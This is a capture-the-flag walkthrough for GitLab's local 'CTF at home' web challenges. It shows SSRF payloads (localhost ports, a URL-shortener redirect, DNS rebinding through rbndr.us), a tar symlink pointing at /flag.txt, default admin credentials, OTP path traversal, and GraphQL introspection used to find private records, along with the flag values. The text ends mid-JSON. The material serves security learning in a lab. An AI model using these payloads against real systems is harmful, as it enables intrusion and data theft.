# GitLab CTF CTF-ATHOME | Web Application (Container) | Walkthrough | Ads Dawson | October 2023

# 😇😇 ###### DISCLAIMER ###### *Spoilers below!* 😇😇

# [GitLab CTF `CTF-ATHOME` Writeup](https://about.gitlab.com/blog/2020/08/12/how-to-play-gitlab-ctf-at-home/)

[@GangGreenTemperTatum](https://github.com/GangGreenTemperTatum)

**v1.0, 10-16-2023**

![https://user-images.githubusercontent.com/104169244/229268224-78dce456-889f-40c0-9b05-ff89306732f7.png](https://user-images.githubusercontent.com/104169244/229268224-78dce456-889f-40c0-9b05-ff89306732f7.png)

- This walkthrough does not explain the full concepts of the vulnerabilities used for exploits and assumes knowledge of the techniques as a pre-requisite to attempting the CTF.

## Additional Resources:

- Review or download the **[How to play GitLab's Capture the Flag at home** GitLab blog](https://about.gitlab.com/blog/2020/08/12/how-to-play-gitlab-ctf-at-home/)

## Tips on amending Docker desktop to avoid paying for a license with replacement [Colima](https://github.com/abiosoft/colima) Container Runtime 🐳

- The process should go as following for MAC OS
1. Quit docker desktop
2. Run `docker image ls` → you should get an error like this `Cannot connect to the Docker daemon, ...`
3. Install colima → `brew install colima`
4. Start colima → `colima start --cpu 8 --memory 12` (cpu and memory options only need to be specified on the first run, they persist after that)
5. `docker context use colima`
6. Test the same `docker image ls` command. It shouldn’t error this time around
7. You can now run docker without Docker Desktop! Try building a container or running make dev

Follow up steps

1. Fully uninstall Docker Desktop:
2. Uninstall the docker desktop app from your Mac
3. Install the docker cli `brew install docker`
4. Edit `~/.docker/config.json` and remove the `credsStore` entry
5. `docker context use colima`
6. Install `buildx` and `docker-compose`

```jsx
brew install docker-buildx docker-compose
mkdir -p ~/.docker/cli-plugins
ln -sfn /opt/homebrew/opt/docker-compose/bin/docker-compose ~/.docker/cli-plugins/docker-compose
ln -sfn /opt/homebrew/opt/docker-buildx/bin/docker-buildx ~/.docker/cli-plugins/docker-buildx
```

> If it fails with error: `ERROR: error during connect: Get "https://%2FUsers%2Fmyuser%2F.colima%2Fdefault%2Fdocker.sock/_ping": dial tcp: lookup /Users/myuser/.colima/default/docker.sock: no such host`
> 
- Make sure `DOCKER_HOST` is not set
- Make sure the docker context is set to `colima` by running:
`docker context use colima`
- Link the docker socket to the colima socket
`sudo ln -sf $HOME/.colima/default/docker.sock /var/run/docker.sock`

## Setup your local environment: 🌊

- Ensure [Docker](https://www.docker.com/) is setup on your localhost
    
    > Note, from experience this lab will work in an isolated air-gapped environment but may fail when is comes to DNS requests
    > 
- I'd recommend ensuring you have a web proxy, [Postman](https://postman.com/) and [Burp Suite](https://portswigger.net/) tools setup as tools, but additional internet access may help you with downloading tools from other repo's that you discover are needed during the challenges.
- I'll be demonstrating my walkthrough using different examples and techniques of them all to mix it up.
    
    > Note, when using a tool such as Burp Suite to manipulate, proxy and send web requests to the application, you are most likely going to need to URL-encode the values sent (unless performed by default) as they would naturally when you emulate a user on the frontend [HAPPY-path](https://www.notion.so/crAPI-Web-Application-Walkthrough-Ads-Dawson-September-2023-93d47975bde547a7a4048bbd2e72531d?pvs=21) regular browsing session or experience.
    > 

```
git clone https://gitlab.com/gitlab-com/gl-security/ctf-at-home.git
cd ctf-at-home
docker-compose up

# Once done, visit <http://capture.local.thetanuki.io> to get to the landing page

ctf-at-home master % docker ps -a
CONTAINER ID   IMAGE                                                                         COMMAND                  CREATED         STATUS                       PORTS                                             NAMES
203375c8cde7   registry.gitlab.com/contribute2020ctf/site:v1-0-1                             "/docker-entrypoint.…"   5 minutes ago   Up 5 minutes                 80/tcp                                            ctf-at-home-content-1
7c9f6d140945   registry.gitlab.com/contribute2020ctf/challenges/graphql:challenge-1-v1-0-0   "bin/run"                5 minutes ago   Up 5 minutes                 3000/tcp                                          ctf-at-home-graphql1-1
114223a426f2   registry.gitlab.com/contribute2020ctf/challenges/oh-tipi:fe_master-v1-0-0     "bin/run"                5 minutes ago   Up 5 minutes                                                                   ctf-at-home-otp-frontend-1
c0e0e275b29e   registry.gitlab.com/contribute2020ctf/challenges/oh-tipi:otp_master-v1-0-0    "/app/oh-tipi"           5 minutes ago   Up 5 minutes                 10000/tcp                                         ctf-at-home-otp-backend-1
09c39f955342   registry.gitlab.com/contribute2020ctf/challenges/ssrf:latest-v1-0-0           "/app/ssrf"              5 minutes ago   Up 5 minutes                 8080/tcp                                          ctf-at-home-ssrf3-1
38d4c4d043db   registry.gitlab.com/contribute2020ctf/challenges/gee-cee-m:latest-v1-0-0      "bin/run"                5 minutes ago   Exited (137) 4 minutes ago                                                     ctf-at-home-aesgcm-1
7c7dd6953c2e   registry.gitlab.com/contribute2020ctf/challenges/tar2zip:latest-v1-0-0        "/app/script.sh"         5 minutes ago   Up 5 minutes                 4567/tcp                                          ctf-at-home-tar2zip-1
41d37dbb6c3c   registry.gitlab.com/contribute2020ctf/challenges/ssrf:latest-v1-0-0           "/app/ssrf"              5 minutes ago   Up 5 minutes                 8080/tcp                                          ctf-at-home-ssrf2-1
8c4d39bfa820   registry.gitlab.com/contribute2020ctf/challenges/graphql:challenge-2-v1-0-0   "bin/run"                5 minutes ago   Up 5 minutes                 3000/tcp                                          ctf-at-home-graphql2-1
f558da898d60   registry.gitlab.com/contribute2020ctf/challenges/rst:level2-v1-0-0            "bin/run"                5 minutes ago   Up 5 minutes                 3000/tcp                                          ctf-at-home-rstlevel2-1
1ec34b179dc2   traefik:v2.2                                                                  "/entrypoint.sh --pr…"   5 minutes ago   Up 5 minutes                 0.0.0.0:80->80/tcp, :::80->80/tcp                 ctf-at-home-traefik-1
54c846290864   registry.gitlab.com/contribute2020ctf/challenges/ssrf:latest-v1-0-0           "/app/ssrf"              5 minutes ago   Up 5 minutes                 8080/tcp                                          ctf-at-home-ssrf1-1
ef440b4c2c34   registry.gitlab.com/contribute2020ctf/challenges/rst:level1-v1-0-0            "bin/run"                5 minutes ago   Up 5 minutes                 3000/tcp                                          ctf-at-home-rst-1
```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled.png)

- Set your Burp Suite scope to ****Advanced**** and enter: (drop out of scope requests)
    
    ```markdown
    Host: ^capture\.local\.thetanuki\.io$
    Port: ^80$
    File: ^/.*
    
    Host: ^thetanuki\.*$
    Port: ^80$
    File: ^/.*
    
    Host: ^thetanuki\.*$
    Port: ^/.*
    File: ^/.*
    
    etc.
    ```
    

# Challenges: 🪛 Methodologies and Attack Vectors

## Sea-Surf 1-3 | SSRF (Server Side Request Forgery) 😈

### [Sea-Surf Challenge](http://capture.local.thetanuki.io/sea-surf) **1**:

- Sea-Surf challenges 1-3 are SSRF-based (Server Side Request Forgery).
- There are 3 different challenges, each with an increasing level of input url validation.
- I'll demonstrate these "easier" challenges in the browser by happy-path.
- SSRF-based attacks provide a follow-on mechanim(s) for further manipulation or exploits. However, ultimately in this lab our aim is to induce the server-side application to make requests to an unintended location.
- Let's try the server itself:

`http://127.0.0.1`

![https://user-images.githubusercontent.com/104169244/229268239-43aa0548-0006-4c19-b4df-e8b55a1245b6.png](https://user-images.githubusercontent.com/104169244/229268239-43aa0548-0006-4c19-b4df-e8b55a1245b6.png)

- From the error `Error: Head <http://127.0.0.1>: dial tcp 127.0.0.1:80: connect: connection refused`, its clear that the connectivity is permitted but on the wrong layer-4 TCP port.
- We could use a tool such as the [Burp Suite Intruder]([https://portswigger.net/burp/documentation/desktop/tools/intruder#:~:text=Burp Intruder is a tool,into predefined positions each time.)](https://portswigger.net/burp/documentation/desktop/tools/intruder#:~:text=Burp%20Intruder%20is%20a%20tool,into%20predefined%20positions%20each%20time.)) to enumerate TCP ports 0-65535 as a spray of individual HTTP POST requests to identify the permitted port's if any.
- Another alternate approach could be to look for another commonly used HTTP port such as NGINX default:

`http://127.0.0.1:8080`

![https://user-images.githubusercontent.com/104169244/229268249-b7c416a4-6947-4a06-ad6e-b3a2e7e64a2f.png](https://user-images.githubusercontent.com/104169244/229268249-b7c416a4-6947-4a06-ad6e-b3a2e7e64a2f.png)

🙌 **Voila**!

- Right-click the page, `view page source` and haul your `X-Ctf-Flag` flag!

`[tanuki](9f433e5264fe2ce062a61b83d76001e1)`

![https://user-images.githubusercontent.com/104169244/229268256-035034c7-850a-4627-ae33-2a35ae763e80.png](https://user-images.githubusercontent.com/104169244/229268256-035034c7-850a-4627-ae33-2a35ae763e80.png)

### [See-Surf Challenge](http://capture.local.thetanuki.io/sea-surf) **2**:

- Let's switch gears and try a redirect to the same localhost which we know is exploitable with SSRF via `http://127.0.0.1:8080` since as though our initial attempt from challenge 1 obviously fails.
- Searching for repo's such as [GitHub](https://github.com/search?q=ssrf+payloads) for "SSRF Payloads", or even a Google Dork for "SSRF to localhost redirect" returns a plethora of templates of payloads in which again we could use a tool like [Burp Suite Intruder]([https://portswigger.net/burp/documentation/desktop/tools/intruder#:~:text=Burp Intruder is a tool,into predefined positions each time.)](https://portswigger.net/burp/documentation/desktop/tools/intruder#:~:text=Burp%20Intruder%20is%20a%20tool,into%20predefined%20positions%20each%20time.)) to enumerate a barrage of HTTP POST request's with unique SSRF redirect payloads, example from [Hahwul](https://www.hahwul.com/phoenix/ssrf-open-redirect/)'s fantastic cheatsheet:

`?url=http://127.0.0.1:8080`

<img width="1217" alt="image" src="[https://user-images.githubusercontent.com/104169244/229268317-8236f3d3-38ff-4785-8ef5-e8befa8cb2d9.png](https://user-images.githubusercontent.com/104169244/229268317-8236f3d3-38ff-4785-8ef5-e8befa8cb2d9.png)">

- No dice.. and `Error: invalid url format` (using either IPv4 loopback or FQDN of `localhost` as well as the FQDN itself `ssrf2.local.thetanuki.io`) tells us that input validation coded into the web application is preventing this connection.
- How about using an external redirect service you say?

![https://user-images.githubusercontent.com/104169244/229268341-6835bdbc-ff3d-49ae-8847-ac6528a070fd.png](https://user-images.githubusercontent.com/104169244/229268341-6835bdbc-ff3d-49ae-8847-ac6528a070fd.png)

- There are a few tools we could use to manipulate, create and validate our own external redirect service with one popular option to mention is [NGROK](https://ngrok.com/).
    - Here's a great follow-up blog on [Ngrok for Penetration Tester’s](https://medium.com/geekculture/ngrok-for-penetration-testers-78761ba0d02) that explains on how to build a service or listener.
    - I'd recommend [FRP](https://github.com/fatedier/frp) as a base project if your looking for something open-source and could even create an immutable template from in your own cloud infrastructure for an on-demand, self-managed approach which you can also boster with your own additional security controls.

> Note, all network requests (and sometimes more) for commercialized tools are normally logged. You should never be without consent or a clear agreement to engage.
> 
- An easy approach would be to use a service such as [bit.ly](https://bitly.com/), [Tinyurl](https://tinyurl.com/) or other external redirect service that we can use to create a URL shortener that ultimately points to localhost.
- Bitly won't let us specify `localhost` here, but will accept IPv4 addresses which we can use to represent
    - Note, the generated shorted URL will be unique each time.

`https://bit.ly/3KoYCo4`

![https://user-images.githubusercontent.com/104169244/229268292-ef407ff5-5e86-4fad-aaa5-c8e01ec5abaf.png](https://user-images.githubusercontent.com/104169244/229268292-ef407ff5-5e86-4fad-aaa5-c8e01ec5abaf.png)

![https://user-images.githubusercontent.com/104169244/229268591-d85718fe-298a-4f20-a0bf-8a6f6eb981f7.png](https://user-images.githubusercontent.com/104169244/229268591-d85718fe-298a-4f20-a0bf-8a6f6eb981f7.png)

🙌 **Voila**!

- Right-click the page, `view page source` and haul your `X-Ctf-Flag` flag!

`[tanuki](befc98f16f2c5eae327472d4a996e017)`

![https://user-images.githubusercontent.com/104169244/229268597-116ed82b-9a8f-4378-a6ac-d54429a0aaa3.png](https://user-images.githubusercontent.com/104169244/229268597-116ed82b-9a8f-4378-a6ac-d54429a0aaa3.png)

### [Si-Surf Challenge](http://capture.local.thetanuki.io/sea-surf) **3**:

- Building on our knowledge and experience gained from challenges 1 and 2 as well as mulling some initial hypothesises, I looked into a DNS rebinding attack to circumvent what seems to show the web application's working input sanitization of the `url` parameter.
    - This is where the application will use a short TTL (time-to-live) to resolve `localhost` (itself) as the first IPv4 address and a public (external) IPv4 address for me to perform another external-redirect-based SSRF attack.
    - I initially turned to a good old friend in [nip.io](https://nip.io/) which was missing the (*IP*) notiation I was looking for after admittingley prioritizing others like hexadecimal, decimal and octal which didn't hit lucky red for me in this case.
- I performed a Google search for "*DNS Rebinding Service*" and found Tavis Ormandy's fantastic DNS rebinding server tool [rbndr](https://lock.cmpxchg8b.com/rebinder.html) ([rbndr Git](https://github.com/taviso/rbndr)).
    - I.E, an example payload using `127.0.0.1` as the first IPv4 address and `1.1.1.1` (randomly chosen) as the second IPv4 address provides me:

`http://7f000001.01010101.rbndr.us:8080`

If the address doesn’t make sense, that is hexadecimal notation for the internal IPv4 address and then the public IPv4 address, followed by `rbndr.us:8080`.
<br>

> The hostname generated will resolve randomly to one of the addresses specified with a very low TTL (Time-To-Live).
> 

`http://7f000001.01010101.rbndr.us:8080`

> 7f000001 (Hex format) = 127.0.0.1 (IPv4 dotted decimal format)
> 

> 01010101 (Hex format) = 1.1.1.1 (IPv4 dotted decimal format)
> 

> 🧠 Hint, try ping 7f000001 from your host to test what you see.
> 

> Note, depending on the TTL of the DNS request you may get a cached response and therefore may have to run this a few times and give it some time.
> 

![https://user-images.githubusercontent.com/104169244/229268895-93083ea4-41e6-40e9-8c14-a299d2424947.png](https://user-images.githubusercontent.com/104169244/229268895-93083ea4-41e6-40e9-8c14-a299d2424947.png)

🙌 **Voila**!

- Right-click the page, `view page source` and haul your `X-Ctf-Flag` flag!

`[tanuki](b98e27ae8ae849787c1a0cbdc1b9a35c)`

![https://user-images.githubusercontent.com/104169244/229268905-38fad138-4c97-4ec3-bcd3-76b00ae4ae49.png](https://user-images.githubusercontent.com/104169244/229268905-38fad138-4c97-4ec3-bcd3-76b00ae4ae49.png)

---

## Tar 😈

### [tar2zip](http://capture.local.thetanuki.io/tar2zip)

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%201.png)

- Navigate to [http://tar2zip.local.thetanuki.io/](http://tar2zip.local.thetanuki.io/)
- Here we use the `ln` [command](https://en.wikipedia.org/wiki/Ln_(Unix)) from the Unix library to create a symbolic link for `/flag.txt` (as per the hint on the pre-landing page). As per the man pages:

```jsx
The ln utility creates a new directory entry (linked file) for the file name specified by target_file.  The target_file will be created with the same file modes as the source_file.  It is useful for maintaining multiple copies of a file in many places at once without using up storage for the “copies”; instead, a link “points” to the original copy.  There are two types of links; hard links and symbolic links.  How a link “points” to a file is one of the differences between a hard and symbolic link.
..
-s    Create a symbolic link.
..
```

- Create a symbolic link with the flag: `ctf-at-home master % ln -s /flag.txt testfile`
- Then `tar` the file so it is accepted by the application `ctf-at-home master % tar cvf tar2zip.tar testfile`

```jsx
ctf-at-home master % tar cvf tar2zip.tar testfile
a testfile
ctf-at-home master % ls testfile*
lrwxr-xr-x  1 adam  staff  -    9B 14 Oct 19:20 testfile@ -> /flag.txt
ctf-at-home master % ls tar2*
-rw-r--r--  1 adam  staff  -  1.5K 14 Oct 19:24 tar2zip.tar
```

- Upload the `tar` file and instantly receive a `.zip` file in return, inspect the contents of the unzipped file:

```jsx
Downloads % ls testfil*
-rw-r--r--@ 1 adam  staff  -   43B 14 Oct 18:56 testfile
Downloads % cat testfile
[tanuki](b1520f7fa002b707bf882ab1302848ae)
```

---

## AES GCM Encryption - In-progress

### [GEE CEE M - 1](http://capture.local.thetanuki.io/gee-cee-m)

- 

`IN-PROGRESS`

### [GEE CEE M - 2](http://capture.local.thetanuki.io/gee-cee-m-two)

- 

`IN-PROGRESS`

---

## [GTP & OTP](http://capture.local.thetanuki.io/gtp-otp) 😈

## GTP

Here, we can download the source code from the prompt to inspect. As the prompt mentions a hint, let’s `grep` based on search criteria:

```jsx
ctf-at-home master % ls front*
\-rw-r--r--@ 1 adam  staff  -  150K 14 Oct 19:50 frontend.tar.gz
ctf-at-home master % tar -xvzf frontend.tar.gz
x frontend/
x frontend/app/

ctf-at-home master % tree frontend
frontend
├── .browserslistrc
├── .gitignore
├── .ruby-version
├── Dockerfile
├── Gemfile
├── Gemfile.lock
├── README.md
├── Rakefile
├── app
│   ├── assets
│   │   ├── config
│   │   │   └── manifest.js
│   │   ├── images
│   │   │   └── .keep
│   │   └── stylesheets
│   │       ├── application.css
│   │       ├── tfa.scss
│   │       └── topsecret.scss
│   ├── channels
│   │   └── application_cable
│   │       ├── channel.rb
│   │       └── connection.rb
│   ├── controllers
│   │   ├── application_controller.rb
│   │   ├── concerns
│   │   │   └── .keep
│   │   ├── tfa_controller.rb
│   │   └── topsecret_controller.rb
│   ├── helpers
```

First time’s a charm!

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%202.png)

```jsx
frontend master % grep -RIHn "admin" /Users/adam/git/ctf-at-home/frontend --color=always
/Users/adam/git/ctf-at-home/frontend/config/initializers/assets.rb:14:# Rails.application.config.assets.precompile += %w( admin.js admin.css )
/Users/adam/git/ctf-at-home/frontend/db/seeds.rb:8:User.create(username: 'admin', password: 'admin', email: 'admin@thetanuki.io')
```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%203.png)

`[tanuki](d6600d7e1e1fc164a4f7839eb7a1051c)`

## OTP

As per the prompt, it seems that brute-forcing with Burp intruder for the OTP is not an option here and as such we need to inspect the `golang` source code:

```jsx
frontend master % cat ../otp.go
package main

import (
	"fmt"
	"github.com/gorilla/pat"
	"github.com/jinzhu/gorm"
	_ "github.com/jinzhu/gorm/dialects/sqlite"
	"github.com/xlzd/gotp"
	"log"
	"net/http"
)

type User struct {
	gorm.Model
	Secret string
	Name   string
}

var mux = pat.New()
var db *gorm.DB

func healthPage(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "Status: OK!")
	fmt.Println("Endpoint Hit: healthPage")
}

func verifyOTP(w http.ResponseWriter, r *http.Request) {
	userName := r.URL.Query().Get(":username")
	code := r.URL.Query().Get(":code")
	fmt.Println("Endpoint Hit: verifyOTP")
	user := User{}
	db.Where("name = ?", userName).Find(&user)
	if user.Name != "" {
		totp := gotp.NewDefaultTOTP(user.Secret)
		if code == totp.Now() {
			w.WriteHeader(http.StatusOK)
			fmt.Fprintf(w, "OK %s %s", totp.Now(), code)
			return
		}
		w.WriteHeader(http.StatusForbidden)
		fmt.Fprintf(w, "WRONG %s %s", totp.Now(), code)
		return
	}
	w.WriteHeader(http.StatusForbidden)
	fmt.Fprintf(w, "Fail")

}
func init() {

	var err error
	db, err = gorm.Open("sqlite3", ":memory:")
	if err != nil {
		panic("failed to connect database")
	}

	mux.Get("/otp/verify/{username}/{code}", verifyOTP)
	mux.Get("/health", healthPage)
}

func main() {

	defer db.Close()

	log.Fatal(http.ListenAndServe(":10000", mux))
}
```

Here, from understanding the hint it is clear that you have to manipulate the path to be interpreted as `/health` by manipulating the frontend input so `healthPage` returns `OK` (`200`) and since this is a black-box test, we amend the frontend OTP entered as `../../../health`.

`[tanuki](d759fe014c256d5bdf6e7bb1e01eec89)`

---

## [Tanuki Vault 1-3](http://capture.local.thetanuki.io/vault) - In-progress 📲

- 

---

## [Graphicle](http://capture.local.thetanuki.io/graphicle-one) 😈

### [Graphicle One](http://capture.local.thetanuki.io/graphicle-one):

Graphicle is a project management tool with a GraphQL endpoint. There has been a report that one project contains data from a data breach of another site.

Navigate to [http://graphicle-one.local.thetanuki.io/](http://graphicle-one.local.thetanuki.io/) and load up `GraphiQL` [tool](https://github.com/graphql/graphiql) (GraphQL IDE). Note: If you need a hint, there might just be an **endpoint** for that. 😉

Let’s send an introspection query in aid to return the (we are looking for this aforementioned (**endpoint**) schema of the GraphQL endpoint.

A basic introspection query looking like:

```jsx
{
  __schema {
    queryType {
      fields {
        name
				description
				type
      }
    }
  }
}
```

Or: (to include mutations, queries and fields)

```jsx
fragment FullType on __Type {
  kind
  name
  fields(includeDeprecated: true) {
    name
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      locations
      args {
        ...InputValue
      }
    }
  }
}
```

Or a more advanced introspection query ([this](https://gist.github.com/martinheld/9fe32b7e2c8fd932599d36e921a2a825) is an awesome resource)

```jsx
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

The awesome resource above shows how you can use cURL to send a `POST` request via the terminal to view introspection: `ctf-at-home master % curl -i -X POST [http://graphicle-one.local.thetanuki.io/graphiql](http://graphicle-one.local.thetanuki.io/graphiql) -d ./introspection_query.json`

```jsx
ctf-at-home master % curl -i -X GET http://graphicle-one.local.thetanuki.io/graphiql -d ./introspection_query2.json
HTTP/1.1 200 OK
Cache-Control: max-age=0, private, must-revalidate
Content-Type: text/html; charset=utf-8
Etag: W/"6789040f937ad3429abeba3916db07d5"
Referrer-Policy: strict-origin-when-cross-origin
Set-Cookie: _graphql_session=Rmy13moetRJ2GZ8wtQkMEY4i%2FyzV0KFP%2FFIvIABqap5GYl4b83z6ifR%2Fu9Vii1aDyE7J2DVyh3c6wAdHPaqoSWdJnE9YQkopauDbb54jna1gM%2BCjAGNdCboF64f8IoM8pzueqogty2LNNUozBD5%2FX311NhagnOXs0fQhYV5PZHeZJPZDaDgTEMIwS%2F3roR2gKqz2AzM6xSFyRgJJmJJGm3k1f%2FuzmLYOyZgB%2FJGJSWtH%2FSTg9QBlX27nke85kgr2%2B2NLjGOWYbwZPbOgNKLLZ3d41QWylp0w--SrX8CrJSwI9Rqy5c--FjZcsPMQnSivOdHdGjNN5g%3D%3D; path=/; HttpOnly
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-Request-Id: 2ca5ac8a-7ce9-4183-8b2e-b652bb77121c
X-Runtime: 0.017605
X-Xss-Protection: 1; mode=block
Date: Sun, 15 Oct 2023 03:36:00 GMT
Content-Length: 696

<!DOCTYPE html>
<html>
  <head>
    <title>GraphiQL</title>

    <link rel="stylesheet" media="screen" href="/assets/graphiql/rails/application-7cb0d585f82609498f76c15f2a7588dac4028182329339a2446e3d7a8076ee0d.css" />
    <script src="/assets/graphiql/rails/application-c147d7296f7839f86cd868a93c200b3c3dddaa1602b88a381d490eb82fda6580.js"></script>
  </head>
  <body>
    <div id="graphiql-container" data-graphql-endpoint-path="/graphql" data-headers="{&quot;Content-Type&quot;:&quot;application/json&quot;,&quot;X-CSRF-Token&quot;:&quot;Wrm/mvMQ1KneSfMVJBTdD0ViCGSS7sgtyUrXSiurUfzIiRn9yobaEqmvP+5oqoYbaocix82DRzxDo6DQ/cbDdg==&quot;}" data-query-params="false">Loading...</div>
  </body>
</html>
```

From the GraphiQL IDE, this looks something like:

Let’s probe the endpoints further as we now have three fields, `hint`, `project` and `projects`.

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%204.png)

```jsx
ctf-at-home master % curl -i -X GET 'http://graphicle-one.local.thetanuki.io/graphiql' \
-H 'Content-Type: application/json' \
-H 'Accept: application/json' \
--compressed \
--data-binary '{"query":"{\n\t__schema{\n queryType {\n fields{\n name\n }\n }\n }\n}"}'
```

Now we are able to build a GraphQL query to introspect the projects, we have an ID of each which we can see to poke further into each:

```jsx
query {
  projects {
    id
    name
    description
      }
    }
```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%205.png)

I enumerated through each `project` and found no luck from `1-3` so tried `4` and voila!

```jsx
query {
    project(id: 1) {
        id
        name
        description
				private
    }
}
```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%206.png)

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%207.png)

```jsx
"[tanuki](3fcc0e29cebea65808541af46feb298a)"
```

What actually made also hypothesize this logic was that when we performed introspection earlier [here](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6.md), I saw a `private` (`boolean` type) sub-field available under the `project` field:

```jsx
{
          "kind": "OBJECT",
          "name": "Project",
          "description": null,
          "fields": [
            {
              "name": "description",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "id",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "ID",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "name",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "private",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "Boolean",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            }
          ],
          "inputFields": null,
          "interfaces": [],
          "enumValues": null,
          "possibleTypes": null
        },
```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%208.png)

Under `hint` field: 👀

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%209.png)

We can also see from [earlier](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6.md) introspection that `projects` vs `project` shows only `private:false` projects.

### [Graphicle](http://capture.local.thetanuki.io/graphicle-two) **2**: 😈

Graphicle is a project management tool with a GraphQL endpoint. The Graphicle project hosts their issue tracker on the site. They do love to eat their own dogfood. See if you can find and view a confidential issue in [their public repo](http://graphicle-two.local.thetanuki.io/).

Again, let’s first

```jsx
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}

```

```jsx
{
  __schema {
    queryType {
      fields {
        name
				description
				type {
				  name
				  description
				}
      }
    }
  }
}
```

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2010.png)

![Untitled](GitLab%20CTF%20CTF-ATHOME%20Web%20Application%20(Container)%20%20b32ad8085fa440688db96d98da5d35b6/Untitled%2011.png)

Here’s our hint:

```jsx
{
              "name": "hint",
              "description": null,
              "args": [
                {
                  "name": "id",
                  "description": null,
                  "type": {
                    "kind": "NON_NULL",
                    "name": null,
                    "ofType": {
                      "kind": "SCALAR",
                      "name": "ID",
                      "ofType": null
                    }
                  },
                  "defaultValue": null
                }
              ],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "OBJECT",
                  "name": "Hint",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
```

It doesn’t look like we can enumerate the `ID` of the 

```jsx
{
          "kind": "OBJECT",
          "name": "Hint",
          "description": null,
          "fields": [
            {
              "name": "id",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "ID",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "text",
              "description": null,
              "args": [],
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String",
                  "ofType": null
                }
              },
              "isDeprecated": false,
              "deprecationReason": null
            }
          ],
          "inputFields": null,
          "interfaces": [],
          "enumValues": null,
          "possibleTypes": null
        },
        {
          "kind": "SCALAR",
          "name": "ID",
